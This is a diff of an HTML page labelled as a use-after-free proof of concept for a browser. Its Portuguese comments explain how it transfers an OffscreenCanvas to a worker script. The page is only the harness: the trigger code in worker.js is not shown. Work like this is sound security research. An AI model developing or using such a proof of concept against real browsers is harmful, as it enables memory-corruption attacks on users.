@@ -1,42 +1,46 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="utf-8">
+    <title>UAF PoC — Opção 1 (transferControlToOffscreen)</title>
+</head>
 <body>
+<pre id="log">Iniciando...</pre>
 <script>
-function finish(message) {
-    document.body.appendChild(document.createTextNode(message));   
+function log(msg) {
+    document.getElementById('log').textContent = msg;
 }
 
-const worker = new Worker('resources/opportunistic-load-reentrancy-worker4.js');
+// Verificar suporte a transferControlToOffscreen antes de prosseguir
+if (typeof HTMLCanvasElement === 'undefined' ||
+    typeof HTMLCanvasElement.prototype.transferControlToOffscreen !== 'function') {
+    log('ERRO: transferControlToOffscreen nao suportado.\nUse a Opcao 2 (index.html em opcao2/).');
+} else {
+    // Criar canvas aqui (main thread tem DOM) e transferir ownership ao worker
+    // O Worker nao pode criar canvas diretamente porque nao tem acesso ao DOM
+    var canvas = document.createElement('canvas');
+    canvas.width  = 10;
+    canvas.height = 10;
 
-worker.onmessage = function (event) {
-    const data = event.data;
+    // transferControlToOffscreen() transfere o controle do canvas ao worker
+    // Apos isso, o main thread NAO pode mais usar este canvas
+    var offscreen = canvas.transferControlToOffscreen();
 
-    // Como o Worker não tem DOM, ele pede para a página principal criar o canvas
-    if (data && data.action === 'MEASURE') {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 10;
-            canvas.height = 10;
-            const context = canvas.getContext('2d');
-            
-            context.font = data.font;
-            const result = context.measureText(data.text);
-            
-            console.log('measureText executado na main thread:', result.width);
-            
-            // Retorna o sucesso de volta para o worker continuar/encerrar
-            worker.postMessage({ status: 'success' });
-        } catch (e) {
-            worker.postMessage({ status: 'error', message: e.message });
-        }
-    } else if (data === 'done' || data.status === 'done') {
-        finish("PASS if no crash");
-    }
-};
+    var worker = new Worker('worker.js');
 
-worker.onerror = function (event) { 
-    finish("FAIL: worker error: " + event.message); 
-};
+    worker.onmessage = function(e) {
+        log(e.data);
+    };
+
+    worker.onerror = function(e) {
+        log('ERRO no worker: ' + e.message + ' (linha ' + e.lineno + ')');
+        e.preventDefault();
+    };
+
+    // Envia o canvas como transferible — ownership passa inteiramente ao worker
+    worker.postMessage({ canvas: offscreen }, [offscreen]);
+    log('Canvas transferido ao worker. Aguardando resultado...');
+}
 </script>
 </body>
 </html>
